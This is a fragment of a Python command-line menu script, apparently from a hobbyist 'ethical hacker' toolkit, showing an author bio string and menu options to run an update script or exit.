Ethical Hacker Zork, a passionate self-taught Powerful Ethical Hacker and C,C++,JS,Shell and Python developer and a freelance software engineer from india. my passion for software lies with dreaming up ideas and making them come true with elegant interfaces. i take great care in the experience, architecture, and code quality of the things I build.\n\ni am also an open-source enthusiast and maintainer. i learned a lot from the open-source community and i love how collaboration and knowledge sharing happened through open-source.\'\'\'\n            print(samay23)\n\n\n        elif self.data==4:\n            os.system(\'python update.py\' if os.name==\'nt\' else \'python3 update.py\')\n\n        elif self.data==5:\n            _under_()\n            printcontent(\'Exiting...\')\n            _under_()\n            sys.exit()\n\n        \n\ntry:\n    selfdata = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))\nexcept:\n    _under_()\n    printcontent(\'Please put the number to select options ! \')\n    sys.exit(\'\\nExiting...\')\n\nif __name__ == \'__main__\':\n    Vrushabh = Samay(selfdata)\n    Vrushabh.functions()\n\n\n\n'
